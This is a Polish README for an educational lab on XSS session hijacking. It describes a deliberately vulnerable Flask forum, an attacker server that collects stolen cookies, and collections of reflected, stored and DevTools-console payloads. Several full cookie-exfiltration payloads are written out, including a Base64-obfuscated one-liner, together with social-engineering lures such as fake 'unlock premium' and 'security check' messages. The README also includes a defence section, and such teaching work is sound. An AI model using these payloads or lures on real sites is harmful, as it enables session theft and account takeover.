# PCYB - Browser Session Hijacking

> [!CAUTION]
> **Projekt wyłącznie do celów edukacyjnych!** </br>
> **Używanie tych technik bez zgody jest nielegalne.**

## Spis Treści

- [Opis Projektu](#opis-projektu)
- [Struktura Projektu](#struktura-projektu)
- [Szczegółowy Opis Kluczowych Plików](#szczegółowy-opis-kluczowych-plików)
  - [Konfiguracja Docker](#konfiguracja-docker)
  - [Aplikacja Celu](#aplikacja-celu-aplikacja_celu)
  - [Serwer Atakującego](#serwer-atakującego-serwer_atakujacego)
  - [Payloady XSS](#payloady-xss-payload)
- [Instalacja i Uruchomienie](#instalacja-i-uruchomienie)
  - [Wymagania](#wymagania)
  - [Uruchomienie](#uruchomienie)
  - [Adresy](#adresy)
  - [Loginy](#loginy)
- [Scenariusze Demonstracyjne](#scenariusze-demonstracyjne)
  - [Scenariusz 1: Reflected XSS (URL)](#scenariusz-1-reflected-xss-url)
  - [Scenariusz 2: Stored XSS (Post)](#scenariusz-2-stored-xss-post)
  - [Scenariusz 3: DevTools Console Attack](#scenariusz-3-devtools-console-attack)
- [Jak Się Bronić?](#jak-się-bronić)
  - [Dla Deweloperów](#dla-deweloperów)
  - [Dla Użytkowników](#dla-użytkowników)
- [Bibliografia](#bibliografia)

---

## Opis Projektu

Projekt demonstracyjny przedstawiający podatności **Cross-Site Scripting (XSS)** i techniki kradzieży ciasteczek sesyjnych (Session Hijacking). System składa się z dwóch aplikacji Flask działających w osobnych kontenerach (i sieciach) Docker:

1. **Aplikacja Celu** - Wrażliwe forum z podatnością XSS
2. **Serwer Atakującego** - Panel odbierający skradzione ciasteczka

---

## Struktura Projektu

```
PCYB_Projekt/
│
├───aplikacja_celu
│   ├───static
│   │   ├───css
│   │   └───js
│   └───templates
├───payload
└───serwer_atakujacego
    ├───static
    │   ├───css
    │   └───js
    └───templates

```

---

## Szczegółowy Opis Kluczowych Plików

### Konfiguracja Docker

#### `docker-compose.yml`
**Typ:** Docker Compose Configuration  
**Opis:**  
Definiuje dwa serwisy:
- **web** (port 5009) - Aplikacja forum z podatnością XSS
- **attacker** (port 8888) - Serwer odbierający skradzione ciasteczka

Każdy serwis działa w osobnej sieci Docker (internal_network / external_network), symulując scenariusz ataku cross-origin.

---

### Aplikacja Celu (`aplikacja_celu/`)

#### `aplikacja_celu/Dockerfile`
**Typ:** Dockerfile  
**Obraz bazowy:** python:3.11-slim  
**Opis:**  
Tworzy kontener Docker dla wrażliwej aplikacji forum. Instaluje Flask i uruchamia aplikację na porcie 5009.

#### `aplikacja_celu/main.py`
**Typ:** Python Flask Application  
**Opis:**   Główna aplikacja backend forum z **krytycznymi podatnościami bezpieczeństwa**

**Funkcjonalności:**
- System logowania (użytkownicy: `admin/admin`, `user/user`)
- Przechowywanie sesji w ciasteczkach (bez HttpOnly!)
- Forum z możliwością dodawania postów
- Wyszukiwarka postów

**Podatności:**
- **Reflected XSS** w parametrze `?search=` (linia ~44)
- **Stored XSS** w treści postów (template używa `| safe`)
- Ciasteczka sesji z flagą `httponly=False`
- Brak walidacji danych wejściowych
- Brak CSP (Content Security Policy)

**Kluczowe endpointy:**
- `/` - Strona logowania
- `/protected` - Forum (wymaga autoryzacji)
- `/add_post` - Dodawanie nowych postów
- `/logout` - Wylogowanie

#### `aplikacja_celu/templates/protected.html`
**Typ:** Jinja2 Template (VULNERABLE!)  
**Opis:**  
Główna strona forum typu Twitter/X z **KRYTYCZNĄ PODATNOŚCIĄ**:
- **LINIA ~47:** `{{ search_query | safe }}` - brak escapowania HTML
- **LINIA ~76:** `{{ post.content | safe }}` - posty renderowane jako surowy HTML

---

### Serwer Atakującego (`serwer_atakujacego/`)

#### `serwer_atakujacego/Dockerfile`
**Typ:** Dockerfile  
**Obraz bazowy:** python:3.11-slim  
**Opis:**  
Tworzy kontener Docker dla serwera atakującego na porcie 8888.

#### `serwer_atakujacego/app.py`
**Typ:** Python Flask Application  
**Opis:**  
Backend odbierający skradzione dane:

**Endpointy:**
- `GET /` - Panel wyświetlający skradzione ciasteczka
- `GET/POST /steal` - Endpoint odbierający ciasteczka (accepts GET/POST)
  - Zwraca 1x1px transparent GIF
  - Dodaje nagłówek CORS `Access-Control-Allow-Origin: *`
- `GET /api/cookies` - API JSON ze skradzionymi danymi
- `POST /clear` - Czyszczenie wszystkich danych
- `GET /download/json` - Eksport do JSON
- `GET /download/txt` - Eksport do TXT

**Logika:**
- Przechowuje ciasteczka w liście `stolen_cookies[]`
- Loguje każde przechwycenie w konsoli
- Zbiera metadane: timestamp, IP, User-Agent, Referer

---

### Payloady XSS (`payload/`)

#### `payload/url_xss_payloads.js`
**Typ:** JavaScript (Payload Collection)  
**Payloadów:** 10  
**Opis:**  
Kolekcja payloadów do wstrzykiwania w parametr URL `?search=` (Reflected XSS):

**Payloady:**
1. **Simple Image Tag** - `<img src=x onerror="fetch(...)">` - Najprostszy i najskuteczniejszy
2. **Script Tag Injection** - `<script>new Image().src='...'</script>` - Klasyczne wstrzyknięcie
3. **URL Encoded** - Zakodowane %3C, %3E, %27, %2B - Omija podstawowe filtry
4. **SVG XSS** - `<svg/onload="...">` - Alternatywa dla filtrów blokujących <script>
5. **JavaScript Protocol** - `<a href="javascript:...">` - Wymaga kliknięcia w link
6. **Body Tag with onload** - `<body onload="...">` - Uruchamia się przy ładowaniu strony
7. **Iframe Injection** - Ukryty iframe z `display:none` ładujący payload
8. **String Reversal Trick** - Odwrócenie stringa + `.reverse().join('')` - Zaciemnienie kodu
9. **CharCode Encoding** - `String.fromCharCode(110,101,119...)` - Ekstremalnie trudny do odczytania
10. **Multiple Encoding Layers** - Base64 + URL encode - Podwójne kodowanie, najtrudniejsze do wykrycia

**Social Engineering:**
- "Check out this cool feature!" - przyciąganie uwagi
- "Click this link to verify your account" - fałszywa weryfikacja

**Cel:** Reflected XSS przez parametr URL </br>
**Wektor ataku:** Wysłanie linku ofierze (phishing, media społecznościowe, email, wysłanie linku w poście a forum (typu: zobacz jaki fajny post))

---

#### `payload/forum_payloads.html`
**Typ:** HTML (Payload Collection)  
**Payloadów:** 10  
**Opis:**  
Payloady do wklejenia w posty na forum (Stored XSS):

**Payloady:**
1. **Basic Image Tag with onerror** 
   `Great post! <img src=x onerror="fetch(...)" style="display:none">`  
   - Status: DZIAŁA
   - Impact: BARDZO WYSOKI - niewidoczny, wykonuje się automatycznie
   - Stealth: BARDZO WYSOKI

2. **Link with onmouseover**  
   `I recommend this security article: <a href="#" onmouseover="...">Click here</a>`  
   - Status: DZIAŁA
   - Impact: WYSOKI - aktywuje się przy najechaniu myszką
   - Stealth: WYSOKI

3. **SVG with onload**
   `<svg/onload="fetch(...)"></svg>`  
   - Status: DZIAŁA
   - Impact: BARDZO WYSOKI - natychmiastowe wykonanie
   - Stealth: BARDZO WYSOKI - pusty post z SVG wygląda niewinnie

4. **Script Tag with Base64 Obfuscation**  
   `System test... <script>eval(atob('...'))</script>`  
   - Status: DZIAŁA (jeśli brak CSP)
   - Impact: BARDZO WYSOKI
   - Stealth: BARDZO WYSOKI - Base64 ukrywa prawdziwe intencje

5. **Iframe with JavaScript URL**  
   `Check out the latest tutorial: <iframe src="javascript:..." style="display:none"></iframe>`  
   - Status: DZIAŁA (zależy od przeglądarki)
   - Impact: ŚREDNI
   - Stealth: WYSOKI - niewidoczny iframe

6. **Body Tag with onload**  
   `Welcome! <body onload="..."></body>`  
   - Status: DZIAŁA
   - Impact: WYSOKI
   - Stealth: NISKI - tag body w poście jest podejrzany

7. **Details Tag with ontoggle**  
   `FAQ: <details open ontoggle="..."><summary>Click to expand</summary>Content...</details>`  
   - Status: DZIAŁA
   - Impact: WYSOKI - HTML5 tag, rzadko filtrowany
   - Stealth: BARDZO WYSOKI

8. **Meta Refresh with JavaScript URL**  
   `The page will be updated soon <meta http-equiv="refresh" content="0;url=javascript:...">`  
   - Status: DZIAŁA
   - Impact: WYSOKI
   - Stealth: ŚREDNI

9. **Input with autofocus and onfocus**  
   `Fill out the survey: <input autofocus onfocus="..." placeholder="Your answer">`  
   - Status: DZIAŁA
   - Impact: WYSOKI - autofocus wywołuje onfocus automatycznie
   - Stealth: WYSOKI

10. **Video Tag with onerror**  
    `Recording from the conference: <video src=x onerror="..."></video>`  
    - Status: DZIAŁA
    - Impact: WYSOKI
    - Stealth: WYSOKI - tagi multimedialne są powszechne

**Social Engineering:**
- "Great post! 👍" - wygląda na normalny komentarz
- "I recommend this article" - udawanie pomocnego użytkownika
- "System test..." - fałszywy komunikat administracyjny
- "FAQ" / "Survey" - interaktywne elementy wzbudzające zaufanie

**Cel:** Stored XSS w treści postów </br>
**Wektor ataku:** Każdy użytkownik przeglądający forum zostaje zaatakowany automatycznie

---

#### `payload/devtools_payloads.js`
**Typ:** JavaScript (Payload Collection)  
**Payloadów:** 11
**Opis:**  
Payloady do wklejenia w DevTools Console (Self-XSS wymagający interakcji ofiary):

**Techniki Social Engineering:**
1. **Simple Cookie Stealer** 
   - "Paste this to unlock premium features!"  
   - Ultra prosty, fake komunikat sukcesu z zielonym ✓

2. **Obfuscated Stealer** 
   - Zaciemnione nazwy zmiennych (`_0x1a2b`)  
   - "Account verified successfully!" - fałszywa weryfikacja

3. **Fake Security Check**
   - Kolorowy nagłówek "Security Check" z żółtym tłem
   - Fake progress: "Verifying your session..."
   - Po 1 sekundzie: "✓ Verification Complete - Your account is secure!"

4. **Performance Boost**
   - "BROWSER SPEED BOOST"
   - Fake progress bar: "Loading... 20%, 40%, 60%, 80%, 100%"
   - "Your browser is now 300% faster! 🚀"

5. **Fake Developer Tool**
   - "[DEV TOOL] Application Debugger"
   - Wysyła POST JSON z cookies, localStorage, sessionStorage
   - Wyświetla fake tabelę: Status ✓ OK, Errors: 0, Performance: Excellent

6. **Fake Account Recovery**
   - Czerwony alert: "ACCOUNT SECURITY ALERT"
   - "Your account requires immediate verification"
   - Po 1.5s: "✓ Account Verified Successfully!"

7. **Session Monitor**
   - Nie tylko kradnie obecną sesję, ale MONITORUJE zmiany co 5 sekund
   - Automatycznie wysyła nowe ciasteczka gdy się zmienią
   - "✓ Enhanced features loaded"

8. **Image-based One-liner**
   `new Image().src='...';console.log('✓ Fixed!');`  
   - Najkrótszy możliwy payload z fake komunikatem

9. **Base64 Obfuscated One-liner**
   `eval(atob('bmV3IEltYW...'));console.log('✓ Fixed!');`  
   - Ten sam payload co #8 ale zakodowany Base64
   - Użytkownik widzi tylko gibberish
   - Trudniejszy do wykrycia przez ofiarę

10. **Ultra Obfuscated** 
    - Nawet komunikat sukcesu jest obfuskowany
    - Maksymalne ukrycie intencji

11. **Ultra Short**
    - Absolutnie najkrótszy możliwy payload
    - Brak fake komunikatu, tylko kradzież

12. **Fake Error Fix**  
    - "ERROR FIX UTILITY" - celuje w użytkowników szukających rozwiązań online
    - "Detected common application error. Applying fix..."
    - "✓ Error Fixed! Please refresh the page"

13. **XSS Worm Concept**
    - Próbuje wstrzyknąć się do wszystkich textarea/input na stronie
    - Samopropagujący się payload (proof of concept)
    - Loguje liczbę znalezionych potencjalnych punktów wstrzyknięcia

**Cel:** Self-XSS przez konsolę deweloperską </br>
**Wektor ataku:** Social engineering - nakłonienie ofiary do wklejenia kodu w DevTools (instrukcje na forach, filmach YouTube, fake poradniki "jak odblokować premium", fałszywe rozwiązania problemów technicznych)

---

#### `payload/jsfuck.js - Ciekawostka` 
**Typ:** JavaScript (Heavily Obfuscated)  
**Opis:**  
Demonstracja ekstremalnej obfuskacji używającej tylko 6 znaków: `[]()!+`

**Technika JSFuck:**
- Używa tylko: `[`, `]`, `(`, `)`, `!`, `+`
- Zamienia każdy znak na kombinację tych symboli
- Przykład: `"f"` = `(![]+[])[+[]]`
- Przykład: `"a"` = `(![]+[])[!+[]+!+[]]`

**Długość:**
- Normalny kod: 89 znaków
- JSFuck: 10,787 znaków

**Zastosowanie:**
- Maksymalne ukrycie intencji kodu
- Omijanie filtrów szukających słów kluczowych (`fetch`, `cookie`, `Image`)
- Proof of concept ekstremalnej obfuskacji

**Uwaga:**  
Pełny payload jest zbyt długi aby był praktyczny, ale demonstruje możliwości zaciemnienia kodu JavaScript.

**Pełny działający payload**
https://github.com/34Destiny/PCYB_Projekt/blob/main/payload/jsfuck.js

**Link do kodera:**
https://jsfuck.com/

---

## Instalacja i Uruchomienie

### Wymagania
- Docker
- Docker Compose

### Uruchomienie
```powershell
# Klonowanie repozytorium
git clone https://github.com/34Destiny/PCYB_Projekt.git
cd PCYB_Projekt

# Budowanie i uruchomienie kontenerów
docker-compose up --build
```

### Adresy
- **Aplikacja Forum (cel):** http://localhost:5009
- **Panel Atakującego:** http://localhost:8888

### Loginy
- **Administrator:** `admin` / `admin`
- **Użytkownik:** `user` / `user`

> [!NOTE]
> Nie ma znaczenia czy jest się zalogowanym jako user czy jako admin (2 konta są stworzone na potrzeby demonstracji ataku techniką Stored XSS (Post))

---

## Scenariusze Demonstracyjne

### Scenariusz 1: Reflected XSS (URL)
1. Zaloguj się do forum (http://localhost:5009)
2. Wklej URL z payloadem:
   ```
   http://localhost:5009/protected?search=<img src=x onerror="fetch('http://localhost:8888/steal?cookie='+document.cookie)">
   ```
3. Sprawdź panel atakującego (http://localhost:8888)

### Scenariusz 2: Stored XSS (Post)
1. Zaloguj się do forum
2. Utwórz post z payloadem:
   ```
   Great post! 👍<img src=x onerror="fetch('http://localhost:8888/steal?cookie='+document.cookie)" style="display:none">
   ```
3. Każdy, kto zobaczy ten post, wyśle swoje ciasteczko

### Scenariusz 3: DevTools Console Attack
1. Zaloguj się do forum
2. Otwórz DevTools (F12)
3. Wklej w konsoli:
   ```javascript
   eval(atob('bmV3IEltYWdlKCkuc3JjPSdodHRwOi8vbG9jYWxob3N0Ojg4ODgvc3RlYWw/Yz0nK2RvY3VtZW50LmNvb2tpZQ=='));console.log('✓ Fixed!');
   ```
4. Sprawdź panel atakującego

---

## Jak Się Bronić?

### Dla Deweloperów:
1. **Escapowanie HTML** - Usuń `| safe` z szablonów
2. **Content Security Policy (CSP)** - Ogranicz źródła skryptów
3. **HttpOnly Cookies** - Zmień `httponly=True`
4. **SameSite Cookies** - Użyj `samesite='Strict'`
5. **Walidacja danych** - Sanityzuj input od użytkowników
6. **X-XSS-Protection** - Header dla starszych przeglądarek

### Dla Użytkowników:
1. **NIE wklejaj kodu** do konsoli DevTools
2. **NIE klikaj** podejrzanych linków
3. **Sprawdzaj URL** przed kliknięciem
4. **Używaj rozszerzeń** blokujących skrypty (NoScript)
5. **Aktualizuj przeglądarkę**

---

## Bibliografia

- [OWASP XSS Guide](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger XSS CheatSheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)
- [ MITRE ATT&CK: T1185](https://attack.mitre.org/techniques/T1185/)
